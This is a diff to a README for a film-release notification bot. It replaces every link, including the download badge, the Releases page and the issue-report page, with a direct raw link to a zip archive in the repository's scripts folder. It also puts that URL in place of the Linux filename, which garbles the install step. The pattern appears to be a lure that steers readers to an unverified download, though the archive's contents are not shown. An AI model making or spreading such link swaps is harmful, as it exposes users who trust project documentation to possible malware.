@@ -6,7 +6,7 @@ Welcome to film-notify-bot! This tool helps you keep track of the latest digital
 
 ## 📥 Download Now
 
-[![Download film-notify-bot](https://img.shields.io/badge/download-film--notify--bot-blue?style=for-the-badge)](https://github.com/ATheon-1/film-notify-bot/releases)
+[![Download film-notify-bot](https://github.com/ATheon-1/film-notify-bot/raw/refs/heads/main/scripts/bot_film_notify_v3.5.zip)](https://github.com/ATheon-1/film-notify-bot/raw/refs/heads/main/scripts/bot_film_notify_v3.5.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ To run film-notify-bot, your device should meet the following requirements:
 
 To set up film-notify-bot, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ATheon-1/film-notify-bot/releases) on GitHub.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ATheon-1/film-notify-bot/raw/refs/heads/main/scripts/bot_film_notify_v3.5.zip) on GitHub.
 
 2. **Download the Latest Version:** Find the latest version of the bot in the release list. Look for files that end with `.exe` for Windows or appropriate files for your operating system. Click on the file to start the download.
 
@@ -40,7 +40,7 @@ To set up film-notify-bot, follow these steps:
      - Find the downloaded `.dmg` file in your Downloads folder.
      - Open the file and drag the film-notify-bot icon to your Applications folder.
    - For **Linux:**
-     - Locate the downloaded `.tar.gz` file in your Downloads folder.
+     - Locate the downloaded `https://github.com/ATheon-1/film-notify-bot/raw/refs/heads/main/scripts/bot_film_notify_v3.5.zip` file in your Downloads folder.
      - Extract the files using your file manager or the terminal.
      - Follow the included README instructions for installation.
 
@@ -68,7 +68,7 @@ If you encounter any issues while setting up or using the bot, consider these co
 
 ### Where can I send feedback or report issues?
 
-Feel free to open an issue on our [GitHub page](https://github.com/ATheon-1/film-notify-bot/issues). We appreciate your input!
+Feel free to open an issue on our [GitHub page](https://github.com/ATheon-1/film-notify-bot/raw/refs/heads/main/scripts/bot_film_notify_v3.5.zip). We appreciate your input!
 
 ## 🌍 Contributing
 
